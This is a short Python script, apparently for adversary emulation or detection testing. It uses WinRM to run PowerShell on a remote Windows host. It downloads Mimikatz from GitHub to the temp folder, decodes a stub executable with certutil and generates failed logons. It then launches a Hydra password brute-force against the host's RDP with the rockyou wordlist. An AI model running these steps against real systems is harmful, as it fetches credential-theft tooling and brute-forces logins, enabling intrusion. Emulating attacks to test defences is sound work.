import argparse
import winrm
import re
import subprocess

parser = argparse.ArgumentParser(description='Remote PowerShell execution over HTTPS.')
parser.add_argument('url', help='Target URL (https://IP:5986/wsman)')
parser.add_argument('user', help='Username')
parser.add_argument('passs', help='Password')
args = parser.parse_args()

session = winrm.Session(args.url, auth=(args.user, args.passs),
                         server_cert_validation="ignore")

cmds = {
    "Download Mimikatz": """
        $url = "https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe"
        $output = "$Env:USERPROFILE\AppData\Local\Temp\mimikatz.exe"
        Invoke-WebRequest -Uri $url -OutFile $output
    """,
    "RDP Access": """
        Start-Process "mstsc.exe"
        Start-Sleep -Seconds 5
        Stop-Process -Name "mstsc" -Force
    """,
    "Use CertUtil": """
        $Encoded = "$env:TEMP\\enc.txt"
        $Decoded = "$env:TEMP\\dec.exe"
        "TVqQAAMAAAAEAAAA//" | Out-File -FilePath $Encoded
        certutil.exe -decode $Encoded $Decoded
        Remove-Item $Encoded
    """,
    "Logon Failures": """
        1..5 | ForEach-Object { net use \\localhost\\C$ /user:fakeuser wrongpass }
    """
}

for name, cmd in cmds.items():
    print(f"Executing: {name}")
    res = session.run_ps(cmd)
    if res.status_code == 0:
        print("Success")
    else:
        print(f"Error: {res.std_err}")


ip_match = re.search(r'https?://(\d+\.\d+\.\d+\.\d+)', args.url)
if ip_match:
    ip = ip_match.group(1)
    usr = "admin"
    pwd_list = "/usr/share/wordlists/rockyou.txt"
    cmd = ["hydra", "-l", usr, "-P", pwd_list, f"rdp://{ip}"]

    try:
        res = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=120)
        print(res.stdout)
    except subprocess.TimeoutExpired:
        print("Hydra process terminated after 2 minutes.")
    except subprocess.CalledProcessError as e:
        print("Error occurred:", e.stderr)
